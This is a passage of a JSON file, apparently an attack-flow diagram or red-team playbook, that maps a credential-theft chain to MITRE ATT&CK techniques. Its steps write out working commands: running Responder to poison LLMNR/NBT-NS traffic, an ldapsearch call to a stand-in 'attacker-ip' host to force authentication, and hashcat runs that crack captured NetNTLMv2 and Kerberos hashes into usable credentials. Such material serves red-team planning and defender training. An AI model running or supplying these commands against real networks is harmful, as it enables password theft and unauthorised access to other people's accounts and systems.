  "steps": [
    {
      "id": 1,
      "type": "edge",
      "name": "Enable Capture-Oriented Responder Mode",
      "from": "operator_node",
      "to": "responder_capture_services",
      "icon": "IconProcess",
      "cli": "sudo python3 Responder.py -I eth0 -b",
      "description": "Launch responder capture services tuned for protocol-auth artifact harvesting.",
      "mitre": {
        "id": "T1557.001",
        "tactic": "Credential Access",
        "technique": "LLMNR/NBT-NS Poisoning and SMB Relay"
      }
    },
    {
      "id": 2,
      "type": "edge",
      "name": "Trigger LDAP/Directory Authentication",
      "from": "victim_auth_clients",
      "to": "responder_capture_services",
      "icon": "IconNetwork",
      "cli": "ldapsearch -H ldap://attacker-ip -D 'CN=user,DC=corp,DC=local' -w password",
      "description": "Induce client authentication attempts toward attacker-controlled endpoints.",
      "mitre": {
        "id": "T1187",
        "tactic": "Credential Access",
        "technique": "Forced Authentication"
      }
    },
    {
      "id": 3,
      "type": "edge",
      "name": "Store and Classify Captured Hashes",
      "from": "responder_capture_services",
      "to": "captured_hash_artifacts",
      "icon": "IconData",
      "cli": "ls logs/*NTLM* logs/*Kerberos*",
      "description": "Collected artifacts are categorized by protocol family for deterministic cracking mode selection.",
      "mitre": {
        "id": "T1557.001",
        "tactic": "Credential Access",
        "technique": "LLMNR/NBT-NS Poisoning and SMB Relay"
      }
    },
    {
      "id": 4,
      "type": "edge",
      "name": "Run NetNTLMv2 Crack Path",
      "from": "captured_hash_artifacts",
      "to": "offline_crack_engine",
      "icon": "IconExploit",
      "cli": "hashcat -m 5600 smb-ntlmv2.txt wordlist.txt",
      "description": "Apply mode-specific cracking for NetNTLMv2 captures.",
      "mitre": {
        "id": "T1110.002",
        "tactic": "Credential Access",
        "technique": "Password Cracking"
      }
    },
    {
      "id": 5,
      "type": "edge",
      "name": "Run Kerberos AS-REQ Crack Path",
      "from": "captured_hash_artifacts",
      "to": "offline_crack_engine",
      "icon": "IconExploit",
      "cli": "hashcat -m 7500 kerberos-asreq.txt wordlist.txt",
      "description": "Execute AS-REQ cracking path with the matching hashcat mode.",
      "mitre": {
        "id": "T1110.002",
        "tactic": "Credential Access",
        "technique": "Password Cracking"
      }
    },
    {
      "id": 6,
      "type": "edge",
      "name": "Recover and Return Valid Credentials",
      "from": "offline_crack_engine",
      "to": "recovered_credentials",
      "icon": "IconStolenCredential",
      "description": "Successful crack results are consolidated into usable credential outputs.",
      "mitre": {
        "id": "T1078",
        "tactic": "Initial Access",
        "technique": "Valid Accounts"
      }
    },
    {
      "id": 7,
      "type": "edge",
      "name": "Deliver Results to Operator",
      "from": "recovered_credentials",
      "to": "operator_node",
      "icon": "IconCheck",
      "description": "Credential outputs are returned to operator workflow for authorized validation."
    }
